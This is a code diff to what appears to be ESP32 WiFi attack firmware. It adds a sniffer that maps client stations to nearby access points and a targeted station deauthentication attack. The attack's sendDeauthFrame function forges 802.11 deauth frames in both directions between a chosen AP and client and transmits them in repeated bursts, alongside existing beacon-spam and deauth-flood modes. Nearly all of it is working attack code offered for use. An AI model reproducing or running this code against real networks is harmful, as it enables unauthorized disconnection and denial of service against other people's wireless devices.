@@ -11,6 +11,7 @@
 
 LinkedList<AccessPoint>* access_points;
 LinkedList<AccessPoint>* deauth_flood_ap;
+LinkedList<Station>* device_station;
 
 bool wifiScanRedraw = false;
 
@@ -34,6 +35,7 @@ void WiFiModules::main() {
 	
     access_points = new LinkedList<AccessPoint>();
 	deauth_flood_ap = new LinkedList<AccessPoint>();
+	device_station = new LinkedList<Station>();
 
 	esp_wifi_init(&cfg);
 	esp_wifi_set_mode(WIFI_AP_STA);
@@ -77,7 +79,21 @@ void WiFiModules::mainAttackLoop(WiFiScanState attack_mode) {
 	if (attack_mode == WIFI_ATTACK_DEAUTH) {
 		for (int i = 0; i < 55; i++) sendDeauthAttack();
 	}
-	if (attack_mode == WIFI_ATTACK_AUTH) {
+	else if (attack_mode == WIFI_ATTACK_STA_DEAUTH) {
+		for (int x = 0; x < access_points->size(); x++) {
+			if (access_points->get(x).selected) {
+				AccessPoint sel_ap = access_points->get(x);
+				for (int i = 0; i <  sel_ap.stations->size(); i++) {
+					if (device_station->get(sel_ap.stations->get(i)).selected) {
+						Station sel_sta = device_station->get(sel_ap.stations->get(i));
+						for (int y = 0; y < 55; y++)
+              				this->sendDeauthFrame(sel_ap.bssid, sel_ap.channel, sel_sta.mac);
+					}
+				}
+			}
+		}
+	}
+	else if (attack_mode == WIFI_ATTACK_AUTH) {
 		for (int i = 0; i < 55; i++) sendProbeAttack();
 	}
 	else if (attack_mode == WIFI_ATTACK_RND_BEACON) {
@@ -85,7 +101,7 @@ void WiFiModules::mainAttackLoop(WiFiScanState attack_mode) {
 	}
 	else if (attack_mode == WIFI_ATTACK_STA_BEACON) {
 		for (int i = 0; i < 7; i++) {
-			for (int x = 0; x < (sizeof(stable_ssid_beacon)/sizeof(char *)); x++) {
+			for (int x = 0; x < (sizeof(stable_ssid_beacon) / sizeof(char *)); x++) {
 				sendCustomESSIDBeacon(stable_ssid_beacon[x]);
 			}
 		}
@@ -110,6 +126,9 @@ void WiFiModules::StartMode(WiFiScanState mode) {
 	else if (mode == WIFI_SCAN_AP) {
 		this->StartAPWiFiScan();
 	}
+	else if (mode == WIFI_SCAN_AP_STA) {
+		this->StartAPStaWiFiScan();
+	}
 	else if (mode == WIFI_SCAN_DEAUTH) {
 		this->StartDeauthScan();
 	}
@@ -122,6 +141,10 @@ void WiFiModules::StartMode(WiFiScanState mode) {
 	else if (mode == WIFI_ATTACK_DEAUTH) {
 		this->StartWiFiAttack(mode);
 		Serial.println("[INFO] Starting [Deauth] Attack!");
+	}
+	else if (mode == WIFI_ATTACK_STA_DEAUTH) {
+		this->StartWiFiAttack(mode);
+		Serial.println("[INFO] Starting [Station Deauth] Attack!");
 	}
 	else if (mode == WIFI_ATTACK_DEAUTH_FLOOD) {
 		this->StartDeauthFlood();
@@ -386,7 +409,7 @@ void WiFiModules::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
 
 			if (!in_list) {
 		
-				delay(random(0, 10));
+				vTaskDelay(random(0, 10) / portTICK_PERIOD_MS);
 				for (int i = 0; i < snifferPacket->payload[37]; i++)
 				{
 					essid.concat((char)snifferPacket->payload[i + 38]);
@@ -395,7 +418,7 @@ void WiFiModules::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
 				bssid.concat(addr);
 			
 					
-				if (essid == "") {
+				if (essid.isEmpty()) {
 					essid = bssid;
 				}
 
@@ -425,7 +448,7 @@ void WiFiModules::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
 					snifferPacket->payload[13],
 					snifferPacket->payload[14],
 					snifferPacket->payload[15]},
-					security_type, wpastr, false,
+					security_type, wpastr, false, new LinkedList<uint16_t>(),
 					static_cast<int8_t>(snifferPacket->rx_ctrl.rssi)};
 				
 				access_points->add(_temp_ap);
@@ -433,6 +456,201 @@ void WiFiModules::apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
 				+ ")" + " (RSSI: " + String(snifferPacket->rx_ctrl.rssi) + ")" + " (Security: " + wpastr + ")");
 			}
 		}
+	}
+}
+
+void WiFiModules::apstaSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+	extern WiFiModules wifi;
+	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
+	WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
+	int len = snifferPacket->rx_ctrl.sig_len;
+
+	String essid = "";
+	String bssid = "";
+
+	if (type == WIFI_PKT_MGMT) {
+		len -= 4;
+
+		if ((snifferPacket->payload[0] == 0x80))
+    	{
+			char addr[] = "00:00:00:00:00:00";
+			getMAC(addr, snifferPacket->payload, 10);
+			bool in_list = false;
+			bool mac_match = true;
+
+			for (int i = 0; i < access_points->size(); i++) {
+				mac_match = true;
+
+				
+				for (int x = 0; x < 6; x++) {
+					if (snifferPacket->payload[x + 10] != access_points->get(i).bssid[x]) {
+						mac_match = false;
+						break;
+					}
+				}
+				if (mac_match) {
+					in_list = true;
+					break;
+				}
+			}
+
+			if (!in_list) {
+		
+				vTaskDelay(random(0, 10) / portTICK_PERIOD_MS);
+				for (int i = 0; i < snifferPacket->payload[37]; i++)
+				{
+					essid.concat((char)snifferPacket->payload[i + 38]);
+				}
+
+				bssid.concat(addr);
+			
+					
+				if (essid.isEmpty()) {
+					essid = bssid;
+				}
+
+				display_buffer->add("Ch:" + String(snifferPacket->rx_ctrl.channel) + " " + essid);
+				wifiScanRedraw = true;
+
+				String wpastr = "";
+
+				uint8_t security_type = wifi.getSecurityType(snifferPacket->payload, snifferPacket->rx_ctrl.sig_len);
+
+				switch(security_type) {
+					case WIFI_SECURITY_OPEN: wpastr = "Open"; break;
+					case WIFI_SECURITY_WEP: wpastr = "WEP"; break;
+					case WIFI_SECURITY_WPA: wpastr = "WPA"; break;
+					case WIFI_SECURITY_WPA2: wpastr = "WPA2"; break;
+					case WIFI_SECURITY_WPA2_ENTERPRISE: wpastr = "WPA2/Enterprise"; break;
+					case WIFI_SECURITY_WPA3: wpastr = "WPA3"; break;
+					case WIFI_SECURITY_WPA_WPA2_MIXED: wpastr = "WPA/WPA2 Mixed"; break;
+					case WIFI_SECURITY_WAPI: wpastr = "WAPI"; break;
+				}
+
+				AccessPoint _temp_ap = {essid,
+					static_cast<uint8_t>(snifferPacket->rx_ctrl.channel),{
+					snifferPacket->payload[10],
+					snifferPacket->payload[11],
+					snifferPacket->payload[12],
+					snifferPacket->payload[13],
+					snifferPacket->payload[14],
+					snifferPacket->payload[15]},
+					security_type, wpastr, false, new LinkedList<uint16_t>(),
+					static_cast<int8_t>(snifferPacket->rx_ctrl.rssi)};
+				
+				access_points->add(_temp_ap);
+				Serial.println("[INFO] Added: " + essid + "(Ch: " + String(snifferPacket->rx_ctrl.channel) + ")" + " (BSSID: " + bssid \
+				+ ")" + " (RSSI: " + String(snifferPacket->rx_ctrl.rssi) + ")" + " (Security: " + wpastr + ")");
+			}
+		}
+	}
+
+	if (type == WIFI_PKT_DATA) {
+		char ap_addr[] = "00:00:00:00:00:00";
+		char dst_addr[] = "00:00:00:00:00:00";
+
+		int ap_index = 0;
+
+		// Check if frame has ap in list of APs and determine position
+		uint8_t frame_offset = 0;
+		int offsets[2] = {10, 4};
+		bool matched_ap = false;
+		bool ap_is_src = false;
+
+		bool mac_match = true;
+
+		// Check both addrs for AP addr
+		for (int y = 0; y < 2; y++) {
+		// Iterate through all APs
+		for (int i = 0; i < access_points->size(); i++) {
+			mac_match = true;
+			
+			// Go through each byte in addr
+			for (int x = 0; x < 6; x++) {
+				if (snifferPacket->payload[x + offsets[y]] != access_points->get(i).bssid[x]) {
+					mac_match = false;
+					break;
+				}
+			}
+			if (mac_match) {
+				matched_ap = true;
+				if (offsets[y] == 10)
+					ap_is_src = true;
+				ap_index = i;
+				getMAC(ap_addr, snifferPacket->payload, offsets[y]);
+				break;
+			}
+		}
+		if (matched_ap)
+			break;
+		}
+
+		// If did not find ap from list in frame, drop frame
+		if (!matched_ap)
+			return;
+		else {
+		if (ap_is_src)
+			frame_offset = 4;
+		else
+			frame_offset = 10;
+		}    
+
+		// Check if we already have this station
+		bool in_list = false;
+		for (int i = 0; i < device_station->size(); i++) {
+			mac_match = true;
+			
+			for (int x = 0; x < 6; x++) {
+				if (snifferPacket->payload[x + frame_offset] != device_station->get(i).mac[x]) {
+					mac_match = false;
+					break;
+				}
+			}
+			if (mac_match) {
+				in_list = true;
+				break;
+			}
+		}
+
+		getMAC(dst_addr, snifferPacket->payload, 4);
+
+		// Check if dest is broadcast
+		if ((in_list) || (strcmp(dst_addr, "ff:ff:ff:ff:ff:ff") == 0))
+			return;
+			
+		// Add to list of stations
+		Station sta = {
+						{snifferPacket->payload[frame_offset],
+						snifferPacket->payload[frame_offset + 1],
+						snifferPacket->payload[frame_offset + 2],
+						snifferPacket->payload[frame_offset + 3],
+						snifferPacket->payload[frame_offset + 4],
+						snifferPacket->payload[frame_offset + 5]},
+						false
+						};
+
+		device_station->add(sta);
+			
+		char sta_addr[] = "00:00:00:00:00:00";
+			
+		if (ap_is_src) {
+			getMAC(sta_addr, snifferPacket->payload, 4);;
+		}
+		else {
+			getMAC(sta_addr, snifferPacket->payload, 10);
+		}
+
+		Serial.println("[INFO] Added Station " + String(sta_addr)  +" -> Ap:" + access_points->get(ap_index).essid);
+		display_buffer->add(String(sta_addr));
+		wifiScanRedraw = true;
+		vTaskDelay(10 / portTICK_PERIOD_MS);
+		display_buffer->add("->" + access_points->get(ap_index).essid);
+		wifiScanRedraw = true;
+
+		AccessPoint ap = access_points->get(ap_index);
+		ap.stations->add(device_station->size() - 1);
+
+		access_points->set(ap_index, ap);
 	}
 }
 
@@ -466,7 +684,6 @@ void WiFiModules::deauthSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t t
 }
 
 void WiFiModules::probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
-	extern WiFiModules wifi;
 	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
 	WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
 	int len = snifferPacket->rx_ctrl.sig_len;
@@ -480,7 +697,7 @@ void WiFiModules::probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t ty
 		String probe_req_essid = "";
 		if (snifferPacket->payload[0] == 0x40)
 		{
-			delay(random(0, 10));
+			vTaskDelay(random(0, 10) / portTICK_PERIOD_MS);
 			char addr[] = "00:00:00:00:00:00";
 			getMAC(addr, snifferPacket->payload, 10);
 			for (int i = 0; i < snifferPacket->payload[25]; i++)
@@ -528,7 +745,7 @@ void WiFiModules::beaconSnifferCallback(void* buf , wifi_promiscuous_pkt_type_t 
 				display_buffer->add("Pwn bc dectected!");
 				return;
 			}
-			delay(random(0, 10));
+			vTaskDelay(random(0, 10) / portTICK_PERIOD_MS);
 			add_to_buffer.concat("C:" + String(snifferPacket->rx_ctrl.channel));
 			add_to_buffer.concat(" ");
 			char addr[] = "00:00:00:00:00:00";
@@ -599,6 +816,27 @@ void WiFiModules::StartDeauthScan() {
 	esp_wifi_set_promiscuous(true);
 	esp_wifi_set_promiscuous_filter(&filt);
 	esp_wifi_set_promiscuous_rx_cb(&deauthSnifferCallback);
+	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
+	wifi_initialized = true;
+	vTaskDelay(100 / portTICK_PERIOD_MS);
+}
+
+void WiFiModules::StartAPStaWiFiScan() {
+	delete access_points;
+    access_points = new LinkedList<AccessPoint>();
+	delete device_station;
+	device_station = new LinkedList<Station>();
+
+	Serial.println("[INFO] Starting WiFi/Station scan...");
+
+	esp_wifi_init(&cfg2);
+	esp_wifi_set_storage(WIFI_STORAGE_RAM);
+	esp_wifi_set_mode(WIFI_MODE_NULL);
+	esp_wifi_start();
+	this->setMac();
+	esp_wifi_set_promiscuous(true);
+	esp_wifi_set_promiscuous_filter(&filt);
+	esp_wifi_set_promiscuous_rx_cb(&apstaSnifferCallback);
 	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
 	wifi_initialized = true;
 	vTaskDelay(100 / portTICK_PERIOD_MS);
@@ -768,6 +1006,89 @@ void WiFiModules::sendDeauthAttack() {
 		}
 	}
 }
+
+void WiFiModules::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t sta_mac[6]) {
+	if (!this->wifi_initialized) {
+		Serial.println("[ERROR] WiFi is not initialized, cannot send deauth frame.");
+		return;
+	}
+	
+	this->set_channel = channel;
+	changeChannel();
+	delay(1);
+	
+	// Build AP source packet
+	deauth_frame_packet[4] = sta_mac[0];
+	deauth_frame_packet[5] = sta_mac[1];
+	deauth_frame_packet[6] = sta_mac[2];
+	deauth_frame_packet[7] = sta_mac[3];
+	deauth_frame_packet[8] = sta_mac[4];
+	deauth_frame_packet[9] = sta_mac[5];
+	
+	deauth_frame_packet[10] = bssid[0];
+	deauth_frame_packet[11] = bssid[1];
+	deauth_frame_packet[12] = bssid[2];
+	deauth_frame_packet[13] = bssid[3];
+	deauth_frame_packet[14] = bssid[4];
+	deauth_frame_packet[15] = bssid[5];
+  
+	deauth_frame_packet[16] = bssid[0];
+	deauth_frame_packet[17] = bssid[1];
+	deauth_frame_packet[18] = bssid[2];
+	deauth_frame_packet[19] = bssid[3];
+	deauth_frame_packet[20] = bssid[4];
+	deauth_frame_packet[21] = bssid[5];      
+  
+	// Send packet
+	esp_err_t res_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
+	esp_err_t res_2 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
+	esp_err_t res_3 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
+
+	packet_sent = packet_sent + 3;
+
+	if (res_1 != ESP_OK)
+		packet_sent -= 1;
+	if (res_2 != ESP_OK)
+		packet_sent -= 1;
+	if (res_3 != ESP_OK)
+		packet_sent -= 1;
+  
+	// Build AP dest packet
+	deauth_frame_packet[4] = bssid[0];
+	deauth_frame_packet[5] = bssid[1];
+	deauth_frame_packet[6] = bssid[2];
+	deauth_frame_packet[7] = bssid[3];
+	deauth_frame_packet[8] = bssid[4];
+	deauth_frame_packet[9] = bssid[5];
+	
+	deauth_frame_packet[10] = sta_mac[0];
+	deauth_frame_packet[11] = sta_mac[1];
+	deauth_frame_packet[12] = sta_mac[2];
+	deauth_frame_packet[13] = sta_mac[3];
+	deauth_frame_packet[14] = sta_mac[4];
+	deauth_frame_packet[15] = sta_mac[5];
+  
+	deauth_frame_packet[16] = sta_mac[0];
+	deauth_frame_packet[17] = sta_mac[1];
+	deauth_frame_packet[18] = sta_mac[2];
+	deauth_frame_packet[19] = sta_mac[3];
+	deauth_frame_packet[20] = sta_mac[4];
+	deauth_frame_packet[21] = sta_mac[5];      
+  
+	// Send packet
+	esp_err_t res_1_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
+	esp_err_t res_2_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
+	esp_err_t res_3_1 = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_packet, sizeof(deauth_frame_packet), false);
+
+	packet_sent = packet_sent + 3;
+
+	if (res_1_1 != ESP_OK)
+		packet_sent -= 1;
+	if (res_2_1 != ESP_OK)
+		packet_sent -= 1;
+	if (res_3_1 != ESP_OK)
+		packet_sent -= 1;
+  }
 
 void WiFiModules::sendProbeAttack() {
 	for (int i = 0; i <access_points->size(); i++) {
